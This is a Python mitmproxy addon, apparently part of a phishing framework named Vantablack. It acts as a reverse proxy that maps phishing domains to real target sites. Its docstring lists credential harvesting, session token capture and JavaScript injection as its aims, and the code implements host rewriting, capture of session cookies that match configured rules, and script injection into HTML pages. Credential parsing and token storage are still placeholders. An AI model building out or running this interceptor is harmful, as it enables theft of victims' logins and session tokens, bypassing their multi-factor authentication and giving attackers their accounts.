"""
Vantablack Core v5 - Edge Interceptor
=====================================

Core mitmproxy addon that handles:
- Request rewriting (Phishing Domain -> Target Domain)
- Response rewriting (Target Domain -> Phishing Domain)
- Credential harvesting
- Session token capture
- Javascript injection
"""

import logging
import re
try:
    from mitmproxy import http, ctx
except Exception:
    class http:  # type: ignore
        class HTTPFlow:  # type: ignore
            pass
    class ctx:  # type: ignore
        pass
from core.edge.phishlets import PhishletConfig, PhishletLoader
from core.edge.session import SessionManager

class VantaInterceptor:
    def __init__(self, phishlet: PhishletConfig, session_manager: SessionManager):
        self.phishlet = phishlet
        self.session_manager = session_manager
        self.logger = logging.getLogger("vantablack.edge.interceptor")
        self.logger.info(f"Interceptor loaded for phishlet: {phishlet.name}")

    def request(self, flow: http.HTTPFlow):
        """
        Handle incoming request:
        1. Identify session (cookie/path)
        2. Map host (phishing -> target)
        3. Strip indicators (referer)
        """
        host = flow.request.pretty_host
        
        # TODO: Dynamic mapping based on loaded phishlet
        # For prototype, we assume the first proxy_host maps to target
        target_map = {m.subdomain: m.target for m in self.phishlet.proxy_hosts}
        
        # Check if we are hitting a known phishing host
        # (Simplified matching logic for V5 MVP)
        for phish_sub, target_host in target_map.items():
            if phish_sub in host:
                flow.request.host = target_host
                self.logger.debug(f"Rewrote host: {host} -> {target_host}")
                break
        
        # Capture Credentials (POST)
        if flow.request.method == "POST":
            self._scan_for_credentials(flow)

    def response(self, flow: http.HTTPFlow):
        """
        Handle outgoing response:
        1. Map host (target -> phishing) in Location/Cookies
        2. Inject JS hooks
        3. Capture session tokens
        """
        # 1. Rewrite Location headers
        if "Location" in flow.response.headers:
            loc = flow.response.headers["Location"]
            # TODO: Reverse map target -> phishing domain
            # flow.response.headers["Location"] = ...
            pass

        # 2. Capture Set-Cookie
        self._scan_for_tokens(flow)

        # 3. Inject Content
        if flow.response.content:
            self._inject_scripts(flow)

    def _scan_for_credentials(self, flow: http.HTTPFlow):
        """Analyze POST body for defined credential fields"""
        try:
            content = flow.request.text
            # Simple form-data parsing (should be robustified)
            # This is a placeholder for the actual regex logic from PhishletConfig
            for rule in self.phishlet.credentials:
                if rule.type == "post_param":
                    # Check if param exists in content
                    pass
        except Exception:
            pass

    def _scan_for_tokens(self, flow: http.HTTPFlow):
        """Analyze Set-Cookie headers for session tokens"""
        cookies = flow.response.cookies
        for name, (value, attrs) in cookies.items():
            # Check against phishlet auth_tokens rules
            for rule in self.phishlet.auth_tokens:
                if rule.name == name:
                    # Capture!
                    # Need session_id from flow context (to be implemented)
                    # self.session_manager.capture_token(...)
                    self.logger.info(f"Captured token candidate: {name}")

    def _inject_scripts(self, flow: http.HTTPFlow):
        """Inject JS into HTML responses"""
        if "text/html" in flow.response.headers.get("content-type", ""):
            for injection in self.phishlet.injections:
                if injection.position == "body_end":
                    flow.response.text = flow.response.text.replace(
                        "</body>", 
                        f"<script>{injection.content}</script></body>"
                    )
